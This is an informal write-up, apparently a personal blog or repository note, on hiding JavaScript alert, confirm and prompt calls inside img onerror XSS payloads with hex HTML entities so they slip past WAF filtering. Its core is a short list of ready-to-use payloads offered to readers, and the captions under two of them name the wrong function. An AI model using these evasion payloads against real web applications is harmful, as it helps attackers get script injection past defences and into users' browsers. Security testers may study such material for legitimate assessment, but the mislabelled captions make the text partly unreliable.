# Intro
## What is Obfuscation
Obfuscation is the practice of intentionally making code or data more difficult to understand or read. thats it

# Whats the Point of obfuscating alert event
simply to bypass alert blocking filtration.
First we know what is alert to get to know what we are dealing with
In web development, `alert` is a function in JavaScript that is used to display a dialog box with a specified message and an OK button.
In your web application, let's say you have a login feature. After a user successfully signs in, you might want to provide a welcoming message to greet them. One simple way to achieve this is by using the `alert` function in JavaScript. For example:

```javascript
// Assuming the user successfully signed in
var username = "user123"; // Replace with the actual username
var welcomeMessage = "You have successfully signed in, welcome " + username + "!";
alert(welcomeMessage);
```
In this scenario, after a successful sign-in, the alert function is used to display a personalized welcome message, incorporating the user's username. The message might say something like "You have successfully signed in, welcome user123!".

Sorry for the long example (: but lets dig deep 

# Obfuscation 
using some sources i've found some interesting things like this 
```html
<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>
```
Have you ever seen something like this before? Probably yes, but it becomes incredibly helpful when the alert function is blocked by a WAF or filtration mechs.

so i will provide some script as example if you want to use them, it will be prompt and alert and confirm functions.

# here
```
<img src=x onerror=&#x63;&#x6F;&#x6E;&#x66;&#x69;&#x72;&#x6D;('XSS')>
```
for confirm
```
<img src=x onerror=&#x70;&#x72;&#x6F;&#x6D;&#x70;&#x74;('XSS')>
```
for prompt
```
<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;('XSS')>
```
and this is for alert


## Thanks for reading 
why did i write it? because i was bored at 4 AM
